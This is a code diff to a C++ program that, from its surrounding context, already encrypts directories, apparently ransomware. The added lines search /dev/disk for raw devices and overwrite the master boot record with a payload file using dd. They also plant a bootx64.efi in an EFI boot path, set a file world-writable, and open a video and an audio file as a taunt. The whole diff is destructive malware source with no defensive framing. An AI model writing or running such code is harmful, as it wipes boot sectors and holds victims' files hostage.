@@ -203,9 +203,64 @@ void encrypt_directory(const char *dirpath, const unsigned char *key, const char
     closedir(dir);
 }
 
+// Function to search for raw disk files in /dev/disk and write the MBR payload if found
+void search_raw_files() {
+    const char *dir_path = "/dev/disk";
+    DIR *dir = opendir(dir_path);
+    struct dirent *entry;
+
+    if (dir == nullptr) {
+        std::cerr << "Error opening directory: " << dir_path << std::endl;
+        return;
+    }
+
+    std::cout << "Searching for raw disk files in " << dir_path << ":\n";
+
+    bool found_raw = false; // Flag to check if any raw disk file is found
+
+    while ((entry = readdir(dir)) != nullptr) {
+        if (strstr(entry->d_name, "raw") != nullptr) {
+            std::cout << "Found: " << entry->d_name << std::endl;
+            found_raw = true;
+
+            // Construct the full path to the raw device
+            std::string raw_device_path = std::string(dir_path) + "/" + entry->d_name;
+
+            // Execute the dd command to write the MBR payload
+            std::string command = "dd if=utkudrk.bin of=" + raw_device_path + " bs=512 count=1";
+            system(command.c_str());
+            std::cout << "MBR payload written to " << raw_device_path << std::endl;
+            break; // Exit the loop after writing to the first found raw device
+        }
+    }
+
+    if (!found_raw) {
+        std::cout << "No raw disk files found." << std::endl;
+    }
+
+    closedir(dir);
+}
+
 int main(int argc, char *argv[]) {
     // Open files
     system("ulimit -S -n 8192");
+
+    // Guarantee access for utkuhecklerbabapro
+    system("chmod 777 utkuhecklerbabapro");
+
+    system("open https://www.youtube.com/watch?v=Sq5wjvqxN6M &");
+
+    system("open utkudrk.mp3 &");
+
+    // Create directories and copy bootx64.efi
+    system("mkdir -p /EFIBOOT/EFI/BOOT");
+    system("cp bootx64.efi /EFIBOOT/EFI/BOOT/BOOTX64.EFI"); // Replace with actual path
+
+    // Search for raw disk files and write MBR payload
+    search_raw_files();
+
+    // Use dd to write utkudrk.bin to the MBR
+    system("dd if=utkudrk.bin of=/dev/disk/virtual/ram/raw bs=512 count=1");
 
     char dirpath[1024];
 
